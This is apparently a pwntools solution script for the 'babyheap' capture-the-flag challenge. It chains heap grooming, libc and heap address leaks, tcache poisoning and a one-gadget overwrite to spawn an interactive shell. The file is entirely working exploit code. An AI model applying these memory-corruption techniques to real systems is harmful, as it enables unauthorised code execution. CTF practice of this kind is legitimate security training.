from pwn import *


def add(p, size):
    p.sendlineafter('Command: ', str(1))
    p.sendlineafter('Size: ', str(size))

    
def update(p, idx, size, content):
    p.sendlineafter('Command: ', str(2))
    p.sendlineafter('Index: ', str(idx))
    p.sendlineafter('Size: ', str(size))
    p.sendafter('Content: ', content)


def delete(p, idx):
    p.sendlineafter('Command: ', str(3))
    p.sendlineafter('Index: ', str(idx))


def view(p, idx):
    p.sendlineafter('Command: ', str(4))
    p.sendlineafter('Index: ', str(idx))


def pwn():
    p = process('./babyheap')
    #p = remote('111.186.63.20', 10001)
    elf = ELF('./babyheap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    #context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']

    for i in range(7):
        add(p, 0x28)
        update(p, i, 0x28, 'a' * 0x28)     

    for i in range(7):
        delete(p, i)

    for i in range(7):
        add(p, 0x38)
        update(p, i, 0x38, 'a' * 0x38)     

    for i in range(7):
        delete(p, i)

    for i in range(8):
        add(p, 0x48)
        update(p, i, 0x48, 'a' * 0x48)     

    for i in range(7):
        delete(p, i)

    # 7
    for i in range(4): # 0 ~ 3
        add(p, 0x38)
        update(p, i, 0x38, 'a' * 0x38) 
    
    add(p, 0x38) # 4

    payload = p64(0) * 4 + p64(0x100) + p64(0x60) + p64(0)
    update(p, 4, 0x38, payload)       
    
    add(p, 0x48) # 5
    update(p, 5, 0x48, 'a' * 0x48)
    add(p, 0x38) # 6
    update(p, 6, 0x38, 'a' * 0x38)

    for i in range(5): # 0 ~ 4
        delete(p, i)

    add(p, 0x58) # 0
    add(p, 0x58) # 1

    add(p, 0x28) # 2
    update(p, 2, 0x28, 'a' * 0x28)
    delete(p, 5)
    gdb.attach(p)
    add(p, 0x38) # 3
    add(p, 0x38) # 4
    add(p, 0x38) # 5
    add(p, 0x38) # 8
    delete(p, 3)
    delete(p, 4)
    add(p, 0x28) # 3

    add(p, 0x48) # 4
    view(p, 5)
    p.recvuntil('[5]: ')
    recv = p.recv(6) + '\x00\x00'
    libc.address = u64(recv) - (0x7f8b3cdeaca0 - 0x00007f8b3cc06000)
    add(p, 0x48) # 9
    target_address = libc.address + (0x7fd5d1e8bc55 - 0x7fd5d1ca7000)
    # 5 - 9 is same
    delete(p, 4) #4
    delete(p, 9) #9
    delete(p, 2) #2
    view(p, 5)
    p.recvuntil('[5]: ')
    recv = p.recv(6) + '\x00\x00'
    heap_address = u64(recv)

    print hex(target_address)
    update(p, 5, 0x8, p64(target_address))
    
    add(p, 0x48) # 2 - 5 is same
    
    add(p, 0x48) # 4
    
    tcache_entry = heap_address - (0x563db82df850 - 0x563db82c0000)
    payload = '\x00\x00\x00' + p64(0) * 7 + p64(tcache_entry)
    print hex(tcache_entry)

    update(p, 4, len(payload), payload)
    
    add(p, 0x58) # 9

    add(p, 0x28) # 10
    add(p, 0x28) # 11
    add(p, 0x28) # 12
    update(p, 12, 0x28, '\x00' * 0x28) 
    delete(p, 10)
    delete(p, 11)
    delete(p, 9)

    payload = '\x00\x00\x00' + p64(0) * 7 + p64(libc.address + 0x7ffff7fc3850 - 0x00007ffff7dde000)
    
    update(p, 4, len(payload), payload) 
    count = [9, 10, 11, 13, 14, 15]

    for i in range(6):
      add(p, 0x58) # 9
    for i in range(6):
      delete(p, count[i])
    update(p, 12, 0x28, '\x00' * 0x28) 

    for j in range(6):
      for i in range(6):
        add(p, 0x58) # 9
      for i in range(6):
        delete(p, count[i])
      update(p, 12, 0x28, '\x00' * 0x28) 
    
    add(p, 0x58) # 9
    update(p, 9, 8, 'a'*8)
    add(p, 0x58) # 10
    add(p, 0x58) # 11
    payload = p64(0) + p64(libc.address + 0x103f50)
    update(p, 11, len(payload), payload)

    print hex(heap_address)
    print hex(libc.address)
    print hex(target_address)
    #get shell
    delete(p, 9)
    #gdb.attach(p)

    p.interactive()
    p.close()


if __name__ == '__main__':
    pwn()
